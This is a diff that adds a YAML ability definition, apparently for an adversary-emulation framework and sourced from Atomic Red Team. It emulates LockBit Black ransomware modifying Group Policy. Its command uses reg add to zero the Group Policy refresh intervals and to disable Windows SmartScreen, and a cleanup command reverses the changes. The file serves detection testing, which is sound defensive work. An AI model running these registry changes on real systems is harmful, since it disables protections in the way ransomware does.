@@ -1,0 +1,39 @@
+- id: 9ab80952-74ee-43da-a98c-1e740a985f28
+  name: LockBit Black - Modify Group policy settings -cmd
+  description: An adversary can modify the group policy settings.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1484.001
+    name: 'Domain Policy Modification: Group Policy Modification'
+  platforms:
+    windows:
+      sh:
+        command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC
+          /t REG_DWORD /d 0 /f; reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f; reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f; reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f; reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v EnableSmartScreen /t REG_DWORD /d 0 /f; reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v ShellSmartScreenLevel /t REG_SZ /d Block /f
+        cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC
+          /f >nul 2>&1; reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1; reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTime /f >nul 2>&1; reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffset /f >nul 2>&1; reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v EnableSmartScreen /f >nul 2>&1; reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v ShellSmartScreenLevel /f >nul 2>&1
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1484.001
+  - privilege-escalation
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-12-28T21:50:59.844Z'
+    atomic_guid: 9ab80952-74ee-43da-a98c-1e740a985f28
+    import_timestamp: '2025-06-24T11:15:02.026465Z'
